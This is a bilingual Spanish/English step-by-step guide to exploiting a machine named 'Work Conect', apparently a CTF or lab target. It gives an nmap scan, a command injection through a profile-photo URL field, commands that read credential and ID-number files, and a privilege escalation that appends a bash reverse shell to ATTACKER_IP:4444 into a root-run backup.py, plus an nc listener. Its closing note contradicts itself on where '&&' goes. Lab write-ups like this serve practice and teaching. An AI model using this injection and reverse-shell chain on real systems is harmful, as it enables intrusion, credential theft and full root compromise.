# Quick Start Guide - Work Conect

---

## 🇪🇸 ESPAÑOL

### Pasos Rápidos para Explotar Work Conect

#### 1. **Reconocimiento**
- Ejecutar: `nmap -p- <target_ip>`
- Identificar servicio HTTP en puerto 8000

#### 2. **Acceso Inicial**
- Navegar a `http://<target_ip>:8000`
- Crear cuenta de usuario
- Iniciar sesión en el panel de control

#### 3. **Descubrimiento de Vulnerabilidades**
- Acceder a documentación de API: `http://<target_ip>:8000/docs`
- Ubicar funcionalidad de carga de foto de perfil

#### 4. **Inyección de Comandos (Vector Principal)**
- En el campo de URL de foto, inyectar:
  ```
  http://attacker_ip:8000/file && id
  ```
- Confirmar ejecución de comandos con respuesta exitosa

#### 5. **Extracción de Información Sensible**
- Listar archivos: `&& ls` 
- Leer credenciales: `&&cat /opt/database.db`
- Extraer DNIs: `&&cat /opt/dnis_encontrados.txt`

#### 6. **Escalada de Privilegios**
- Identificar script ejecutado como root: `&&cat /opt/entrypoint.sh`
- Modificar `backup.py` con:
  ```bash
  echo '\nimport os; os.system("/bin/bash -c '\''/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''")' >> /opt/backup.py &&
  ```

#### 7. **Obtener Reverse Shell como Root**
- En tu máquina atacante: `nc -lnvp 4444`
- Esperar a que el script se ejecute (máximo 60 segundos)
- Obtener shell como root

### Tiempo Estimado
**10-15 minutos** (sin tiempos de espera del script)

---

## 🇬🇧 ENGLISH

### Quick Steps to Exploit Work Conect

#### 1. **Reconnaissance**
- Execute: `nmap -p- <target_ip>`
- Identify HTTP service on port 8000

#### 2. **Initial Access**
- Navigate to `http://<target_ip>:8000`
- Create user account
- Log in to the control panel

#### 3. **Vulnerability Discovery**
- Access API documentation: `http://<target_ip>:8000/docs`
- Locate profile photo upload functionality

#### 4. **Command Injection (Primary Vector)**
- In the photo URL field, inject:
  ```
  http://attacker_ip:8000/file && id
  ```
- Confirm command execution with successful response

#### 5. **Sensitive Information Extraction**
- List files: `&& ls ` 
- Read credentials: `&& cat /opt/database.db`
- Extract identification data: `&&cat /opt/dnis_encontrados.txt`

#### 6. **Privilege Escalation**
- Identify script running as root: `&&cat /opt/entrypoint.sh`
- Modify `backup.py` with:
  ```bash
  echo '\nimport os; os.system("/bin/bash -c '\''/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''")' >> /opt/backup.py &&
  ```

#### 7. **Obtain Reverse Shell as Root**
- On your attacker machine: `nc -lnvp 4444`
- Wait for the script to execute (up to 60 seconds)
- Obtain shell with root privileges

### Estimated Time
**10-15 minutes** (excluding script execution wait times)

---

## 📋 Comandos Críticos / Critical Commands

| Acción / Action | Comando / Command |
|---|---|
| **Verificar inyección / Verify injection** | `test && id` |
| **Listar archivos / List files** | `&&ls -la /opt ` |
| **Leer base de datos / Read database** | `&&cat /opt/database.db ` |
| **Leer credenciales / Read credentials** | `&&cat /opt/dnis_encontrados.txt ` |
| **Examinar script / Examine script** | `&&cat /opt/entrypoint.sh ` |
| **Inyectar reverse shell / Inject reverse shell** | `&&echo '...payload...' >> /opt/backup.py ` |

---

**Nota / Note:** Todos los comandos deben incluir `&&` al inicio para confirmar ejecución. / All commands must include `&&` at the end to confirm execution.

Example: 
```bash
http://IP:PORT/image&&ls
```
